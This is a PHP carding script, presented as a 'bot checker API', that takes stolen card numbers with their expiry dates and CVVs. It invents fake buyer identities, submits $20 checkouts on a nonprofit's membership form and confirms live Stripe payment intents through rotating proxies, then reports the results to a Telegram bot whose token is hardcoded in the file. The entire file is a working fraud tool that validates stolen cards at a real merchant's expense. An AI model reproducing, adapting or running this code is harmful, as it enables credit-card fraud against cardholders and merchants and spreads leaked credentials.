<?php

### BOT CHECKER API @ARTERXSKBOT
//-- CAN BE USE IN SITE, JUST FIX IT --//
include dirname(__FILE__)."/../proxy.php";

error_reporting(0);
$delay = "6000";
$newDelay = $delay / 1000;
sleep($newDelay);
date_default_timezone_set('Asia/Tokyo');

$amt = '20$';
$owner = '@artsnipes';
$gateways = 'Intent 20$';

### FUNCTIONS
if ($_SERVER['REQUEST_METHOD'] == "POST") {
 extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
 extract($_GET);
}
function GetStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);
 return $str[0];
}
function inStr($string, $start, $end, $value) {
 $str = explode($start, $string);
 $str = explode($end, $str[$value]);
 return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$last4 = substr($cc, -4);
$bin = substr($cc, 0, 6);

### HITSENDER
$w2s = '-1001890729455';
function hitSender ($w2s, $message) {
 $url = "https://api.telegram.org/bot5912216910:AAGpE0nFs7HK3g1pIlLz-ZDIsICVRXKzKwU/sendMessage?chat_id=".$w2s."&text=".$message."&parse_mode=HTML";
 file_get_contents($url);
}

$tgid = $_GET['tgid'];
function userSender ($tgid, $message) {
 $url = "https://api.telegram.org/bot5912216910:AAGpE0nFs7HK3g1pIlLz-ZDIsICVRXKzKwU/sendMessage?chat_id=".$tgid."&text=".$message."&parse_mode=HTML";
 file_get_contents($url);
}

function value($str, $find_start, $find_end) {
 $start = @strpos($str, $find_start);
 if ($start === false) {
  return "";
 }
 $length = strlen($find_start);
 $end = strpos(substr($str, $start +$length), $find_end);
 return trim(substr($str, $start +$length, $end));
}

function mod($dividendo, $divisor) {
 return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

### EMAIL GENERATOR
function emailGenerate($length = 10) {
 $curlaracters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 $curlaractersLength = strlen($curlaracters);
 $randomString = '';
 for ($i = 0; $i < $length; $i++) {
  $randomString .= $curlaracters[rand(0, $curlaractersLength - 1)];
 }
 return $randomString . '@gmail.com';
}
$email = emailGenerate();

### USERNAME GENERATOR
function usernameGen($length = 13) {
 $curlaracters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 $curlaractersLength = strlen($curlaracters);
 $randomString = '';
 for ($i = 0; $i < $length; $i++) {
  $randomString .= $curlaracters[rand(0, $curlaractersLength - 1)];
 }
 return $randomString;
}
$un = usernameGen();

### PASSWORD GENERATOR
function passwordGen($length = 15) {
 $curlaracters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 $curlaractersLength = strlen($curlaracters);
 $randomString = '';
 for ($i = 0; $i < $length; $i++) {
  $randomString .= $curlaracters[rand(0, $curlaractersLength - 1)];
 }
 return $randomString;
}
$pass = passwordGen();

### CARD TYPE
$cardNames = array(
 "3" => "American Express",
 "4" => "Visa",
 "5" => "MasterCard",
 "6" => "Discover"
);
$card_type = $cardNames[substr($cc, 0, 1)];

### USER DATA
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1, 3);
$numero2 = substr($phone, 6, 3);
$numero3 = substr($phone, 10, 4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com", "homtail.com", "yahoo.com.br", "bol.com.br", "yopmail.com", "outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = str_replace("example.com", $serv_rnd, $email);
if ($state == "Alabama") {
 $state = "AL";
} else if ($state == "alaska") {
 $state = "AK";
} else if ($state == "arizona") {
 $state = "AR";
} else if ($state == "california") {
 $state = "CA";
} else if ($state == "olorado") {
 $state = "CO";
} else if ($state == "connecticut") {
 $state = "CT";
} else if ($state == "delaware") {
 $state = "DE";
} else if ($state == "district of columbia") {
 $state = "DC";
} else if ($state == "florida") {
 $state = "FL";
} else if ($state == "georgia") {
 $state = "GA";
} else if ($state == "hawaii") {
 $state = "HI";
} else if ($state == "idaho") {
 $state = "ID";
} else if ($state == "illinois") {
 $state = "IL";
} else if ($state == "indiana") {
 $state = "IN";
} else if ($state == "iowa") {
 $state = "IA";
} else if ($state == "kansas") {
 $state = "KS";
} else if ($state == "kentucky") {
 $state = "KY";
} else if ($state == "louisiana") {
 $state = "LA";
} else if ($state == "maine") {
 $state = "ME";
} else if ($state == "maryland") {
 $state = "MD";
} else if ($state == "massachusetts") {
 $state = "MA";
} else if ($state == "michigan") {
 $state = "MI";
} else if ($state == "minnesota") {
 $state = "MN";
} else if ($state == "mississippi") {
 $state = "MS";
} else if ($state == "missouri") {
 $state = "MO";
} else if ($state == "montana") {
 $state = "MT";
} else if ($state == "nebraska") {
 $state = "NE";
} else if ($state == "nevada") {
 $state = "NV";
} else if ($state == "new hampshire") {
 $state = "NH";
} else if ($state == "new jersey") {
 $state = "NJ";
} else if ($state == "new mexico") {
 $state = "NM";
} else if ($state == "new york") {
 $state = "LA";
} else if ($state == "north carolina") {
 $state = "NC";
} else if ($state == "north dakota") {
 $state = "ND";
} else if ($state == "Ohio") {
 $state = "OH";
} else if ($state == "oklahoma") {
 $state = "OK";
} else if ($state == "oregon") {
 $state = "OR";
} else if ($state == "pennsylvania") {
 $state = "PA";
} else if ($state == "rhode Island") {
 $state = "RI";
} else if ($state == "south carolina") {
 $state = "SC";
} else if ($state == "south dakota") {
 $state = "SD";
} else if ($state == "tennessee") {
 $state = "TN";
} else if ($state == "texas") {
 $state = "TX";
} else if ($state == "utah") {
 $state = "UT";
} else if ($state == "vermont") {
 $state = "VT";
} else if ($state == "virginia") {
 $state = "VA";
} else if ($state == "washington") {
 $state = "WA";
} else if ($state == "west virginia") {
 $state = "WV";
} else if ($state == "wisconsin") {
 $state = "WI";
} else if ($state == "wyoming") {
 $state = "WY";
} else {
 $state = "KY";
}

### REQ 1
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxyyy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.membershipworks.com/v2/form/613981d77bdc68211d111e04/checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "nam=$firstname%20$lastname&eml=$email&adr[zip]=10007&adr[cot]=New%20York%20County&adr[sta]=NY&adr[con]=US&adr[ad1]=$postcode%20NY&adr[cit]=New%20York&adr[loc][0]=-74.0087126&adr[loc][1]=40.7136487&xho=Google&crd[nam]=$firstname%20$lastname&crd[zip]=10007&crd[cot]=New%20York%20County&crd[sta]=NY&crd[con]=US&crd[ad1]=10007%20NY&crd[cit]=New%20York&crd[loc][0]=-74.0087126&crd[loc][1]=40.7136487&sum=20&itm[0][_id]=614e96b3ea51c930f653ca84&itm[0][amt]=20&itm[0][qty]=1&_pv=1");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://togetherbayarea.org';
$headers[] = 'Referer: https://togetherbayarea.org/';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36';
$headers[] = 'X-Org: 27816';
$headers[] = 'Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: "Linux"';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$resp = curl_exec($ch);
$token = json_decode($resp, true);
$client_s = json_decode($resp, true);
$cs = $client_s['client_secret'];
$req = "R1";

### REQ 2
if (isset($token['id'])) {
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $poxyyy);
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$token['id'].'/confirm');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, "payment_method_data[type]=card&payment_method_data[billing_details][name]=$firstname+$lastname&payment_method_data[billing_details][address][line1]=$postcode+NY&payment_method_data[billing_details][address][city]=New+York&payment_method_data[billing_details][address][state]=NY&payment_method_data[billing_details][address][postal_code]=10007&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][email]=$email&payment_method_data[card][number]=$cc&payment_method_data[card][cvc]=$cvv&payment_method_data[card][exp_month]=$mes&payment_method_data[card][exp_year]=$ano&payment_method_data[guid]=28e7b9cc-0c61-4434-8596-ad9675172c7a5723ff&payment_method_data[muid]=9ca1eca6-551b-4368-bdac-93360cc79132dfb5f8&payment_method_data[sid]=72286544-bc0c-4c84-9080-18a06b64893c8163bc&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fb8f5754acc%3B+stripe-js-v3%2Fb8f5754acc&payment_method_data[time_on_page]=50271&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51IarAkHXdduphfl6oOoEEf1agfjMG3MHqOIIxUbql391PpSZv71RmVUHUzOMydqnEtus6RTOaWW3W3Lj7p512Dqh00kyUkkTxT&client_secret=$cs");
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

 $headers = array();
 $headers[] = 'Authority: api.stripe.com';
 $headers[] = 'Accept: application/json';
 $headers[] = 'Accept-Language: en-US,en;q=0.9';
 $headers[] = 'Content-Type: application/x-www-form-urlencoded';
 $headers[] = 'Origin: https://js.stripe.com';
 $headers[] = 'Referer: https://js.stripe.com/';
 $headers[] = 'Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"';
 $headers[] = 'Sec-Ch-Ua-Mobile: ?1';
 $headers[] = 'Sec-Ch-Ua-Platform: "Android"';
 $headers[] = 'Sec-Fetch-Dest: empty';
 $headers[] = 'Sec-Fetch-Mode: cors';
 $headers[] = 'Sec-Fetch-Site: same-site';
 $headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; vivo 1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

 $resp = curl_exec($ch);
 $req = "R2";
}

### BIN CHECK
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'Host: lookup.binlist.net',
 'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$binresp = curl_exec($ch);
$binresp = json_decode($binresp, true);
$bank = $binresp['bank']['name'];
$country = $binresp['country']['name'];
$emoji = $binresp['country']['emoji'];
$brand = $binresp['brand'];
$scheme = $binresp['scheme'];
$type = $binresp['type'];

### CARD RESPONSE
include 'response/apiresp.php';
//echo ''.$resp.' - '.$req.' - '.$msg.' ['.$ip.']<br>';

# TELEGRAM: @arterxskwtf
# DISCORD: @arterxskwtf#9210
// 盗まないでよクソ野郎！